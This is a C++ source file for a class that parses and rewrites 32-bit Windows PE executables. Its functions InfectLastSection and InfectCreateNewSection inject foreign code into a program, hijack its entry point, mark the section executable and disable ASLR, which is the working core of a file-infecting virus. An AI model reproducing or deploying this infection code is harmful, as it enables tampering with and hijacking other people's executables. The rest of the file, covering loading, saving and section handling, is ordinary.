#include "PEFile.h"
#include <fstream>

PEFile::PEFile(char const* filePath)
	:
	m_filePath(filePath),
	m_fileBuffer(NULL),
	m_fileSize(0),
	m_bufferSize(0),
	m_dosHeader(NULL),
	m_ntHeaders(NULL),
	m_firstSectionHeader(NULL)
{
	LoadFile();
	UpdateHeaderPointers();
}
PEFile::PEFile(PEFile const& rhs)
	:
	m_filePath(rhs.m_filePath),
	m_fileBuffer(NULL),
	m_fileSize(rhs.m_fileSize),
	m_bufferSize(rhs.m_bufferSize),
	m_dosHeader(NULL),
	m_ntHeaders(NULL),
	m_firstSectionHeader(NULL)
{
	m_fileBuffer = new char[m_bufferSize];
	memcpy(m_fileBuffer, rhs.m_fileBuffer, m_fileSize);
	UpdateHeaderPointers();
}
PEFile::~PEFile(void)
{
	if (m_fileBuffer)
		delete[] m_fileBuffer;

}
PEFile& PEFile::operator=(PEFile const& rhs)
{
	if (this != &rhs)
	{
		m_filePath = rhs.m_filePath;
		m_fileSize = rhs.m_fileSize;
		m_bufferSize = rhs.m_bufferSize;

		if (m_fileBuffer)
			delete[] m_fileBuffer;
		m_fileBuffer = new char[m_bufferSize];
		memcpy(m_fileBuffer, rhs.m_fileBuffer, m_fileSize);
		UpdateHeaderPointers();
	}
	return *this;
}
void PEFile::Save(void) const
{
	SaveAs(m_filePath.c_str());
}
void PEFile::SaveAs(char const* filePath) const
{
	std::ofstream file(filePath, std::ofstream::binary);
	if (!file.good())
		throw std::runtime_error("PEFile::SaveAs - Error opening a file for writing.");
	file.write(m_fileBuffer, m_fileSize);
	if (!file.good())
		throw std::runtime_error("PEFile::SaveAs - Error writing to a file.");
}
void PEFile::LoadFile(void)
{
	std::ifstream file(m_filePath, std::ifstream::binary);
	if (!file.good())
		throw std::runtime_error("PEFile::LoadFile - File not found.");

	file.seekg(0, file.end);
	m_fileSize = file.tellg();
	file.seekg(0);

	if (m_fileSize < 1)
		throw std::runtime_error("PEFile::LoadFile - Incorrect File size.");

	m_bufferSize = m_fileSize * 2;
	m_fileBuffer = new char[m_bufferSize];
	file.read(m_fileBuffer, m_fileSize);

	if (!file.good() || file.gcount() != m_fileSize)
		throw std::runtime_error("PEFile::LoadFile - Error reading the file.");
}
void PEFile::InfectLastSection(char const* code, size_t size, DWORD originalEntryPointOffset, DWORD entryPointOffset)
{
	IMAGE_SECTION_HEADER* lastSection = m_firstSectionHeader + m_ntHeaders->FileHeader.NumberOfSections - 1;
	char* newCodePointer = m_fileBuffer + lastSection->PointerToRawData + lastSection->Misc.VirtualSize; // pointer to the beggining of injected code
	memcpy(newCodePointer, code, size);

	DWORD orignalEntryPoint = m_ntHeaders->OptionalHeader.AddressOfEntryPoint;
	m_ntHeaders->OptionalHeader.AddressOfEntryPoint = lastSection->VirtualAddress + lastSection->Misc.VirtualSize + entryPointOffset; // new entry point

	DWORD absoluteOEPAddr = m_ntHeaders->OptionalHeader.ImageBase + orignalEntryPoint; // absolute address of original entry point
	memcpy(newCodePointer + originalEntryPointOffset, &absoluteOEPAddr, sizeof(DWORD));
	lastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;

	m_ntHeaders->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE; // ASLR is not our friend
	ExpandLastSection(size);
}
void PEFile::InfectCreateNewSection(char const* sectionName, char const* code, size_t size, DWORD originalEntryPointOffset, DWORD newEntryPointOffset)
{
	AddSection(sectionName, size);
	InfectLastSection(code, size, originalEntryPointOffset, newEntryPointOffset);
}
void PEFile::ExpandLastSection(size_t size)
{
	IMAGE_SECTION_HEADER* lastSection = m_firstSectionHeader + m_ntHeaders->FileHeader.NumberOfSections - 1;
	
	if (m_fileSize + size > m_bufferSize)
		ReallocateBuffer((m_fileSize + size) * 2);

	size_t newVirtualSize = lastSection->Misc.VirtualSize + size;
	if (newVirtualSize > lastSection->SizeOfRawData)
	{
		size_t alignedSize = Tools::AlignSize(lastSection->Misc.VirtualSize + size, m_ntHeaders->OptionalHeader.FileAlignment);
		lastSection->SizeOfRawData = alignedSize;

		m_fileSize += Tools::AlignSize(alignedSize, m_ntHeaders->OptionalHeader.SectionAlignment);
	}
	lastSection->Misc.VirtualSize = newVirtualSize;
	m_ntHeaders->OptionalHeader.SizeOfImage = lastSection->VirtualAddress + lastSection->Misc.VirtualSize;
}
void PEFile::AddSection(char const* name, size_t size)
{
	if (strlen(name) > 8)
		throw std::runtime_error("PEFile::AddSection - Section name is too long.");
	for (int i = 0; i < m_ntHeaders->FileHeader.NumberOfSections; i++)
	{
		if (strcmp(reinterpret_cast<char*>(m_firstSectionHeader[i].Name), name) == 0)
			throw std::runtime_error("PEFile::AddSection - Section with this name already exists.");
	}
	IMAGE_SECTION_HEADER* newSection = m_firstSectionHeader + m_ntHeaders->FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER* lastSection = newSection - 1;

	if (((m_fileBuffer + m_firstSectionHeader->PointerToRawData) - reinterpret_cast<char*>(newSection)) < sizeof(IMAGE_SECTION_HEADER))
		throw std::runtime_error("PEFile::AddSection - Not enough space for another section header.");
	
	size_t sectionAligned = Tools::AlignSize(size, m_ntHeaders->OptionalHeader.SectionAlignment);
	if (m_fileSize + sectionAligned > m_bufferSize)
		ReallocateBuffer((m_fileSize + sectionAligned) * 2);

	memset(newSection, 0, sizeof(IMAGE_SECTION_HEADER)); //just incase
	memcpy(newSection->Name, name, strlen(name));

	newSection->Misc.VirtualSize = 0;
	newSection->SizeOfRawData = Tools::AlignSize(size, m_ntHeaders->OptionalHeader.FileAlignment);
	newSection->PointerToRawData = lastSection->PointerToRawData + lastSection->SizeOfRawData;
	newSection->VirtualAddress = lastSection->VirtualAddress + Tools::AlignSize(lastSection->Misc.VirtualSize, m_ntHeaders->OptionalHeader.SectionAlignment); // as some section have virtualSize > rawSize, we align virtual size instead of using rawSize

	newSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;
	m_ntHeaders->FileHeader.NumberOfSections++;
	m_ntHeaders->OptionalHeader.SizeOfImage = newSection->VirtualAddress + newSection->Misc.VirtualSize;
	m_fileSize += sectionAligned;
}
void PEFile::WriteSection(char const* code, size_t size, int sectionIndex, DWORD writeOffset)
{
	if (sectionIndex >= m_ntHeaders->FileHeader.NumberOfSections)
		throw std::runtime_error("PEFile::WriteSection - Section index out of bounds.");

	IMAGE_SECTION_HEADER* section = m_firstSectionHeader + sectionIndex;

	if (writeOffset + size > section->Misc.VirtualSize)
		throw std::runtime_error("PEFile::WriteSection - Not enough space in the section");

	memcpy(m_fileBuffer + section->PointerToRawData + writeOffset, code, size);
}
void PEFile::ReallocateBuffer(size_t size)
{
	char* newBuffer = new char[size];
	memcpy(newBuffer, m_fileBuffer, m_fileSize);
	try
	{
		UpdateHeaderPointers(); // Should never really throw here, but just incase, to avoid memory leak
	}
	catch (std::runtime_error& e)
	{
		delete[] newBuffer;
		throw std::runtime_error("PEFile::ReallocateBuffer - Could not recognize headers after reallocation.");
	}
	delete[] m_fileBuffer;
	m_fileBuffer = newBuffer;
	m_bufferSize = size;
}
void PEFile::UpdateHeaderPointers(void)
{
	m_dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(m_fileBuffer);
	if (m_dosHeader->e_magic != 0x5A4D)
		throw std::runtime_error("PEFile::UpdateHeaderPointers - DOS Header not found (Probably not a PE file).");
	m_ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(m_fileBuffer + m_dosHeader->e_lfanew);
	if (m_ntHeaders->OptionalHeader.Magic != 0x010B)
		throw std::runtime_error("PEFile::UpdateHeaderPointers - NT Header not found (Probably a x64 file).");
	m_firstSectionHeader = IMAGE_FIRST_SECTION(m_ntHeaders);
}
size_t PEFile::GetFileSize(void) const
{
	return m_fileSize;
}
size_t PEFile::GetNumberOfSections(void) const
{
	return m_ntHeaders->FileHeader.NumberOfSections;
}
size_t PEFile::Tools::AlignSize(size_t size, size_t alignment)
{
	size_t alignedSize = alignment;
	while (alignedSize < size)
	{
		alignedSize += alignment;
	}
	return alignedSize;
}


size_t PEFile::Tools::GetFunctionSize(void const* function)
{
	size_t funcSize = 0;
	while (reinterpret_cast<char const*>(function)[funcSize++] != OPCODE_RET);
	return funcSize;
}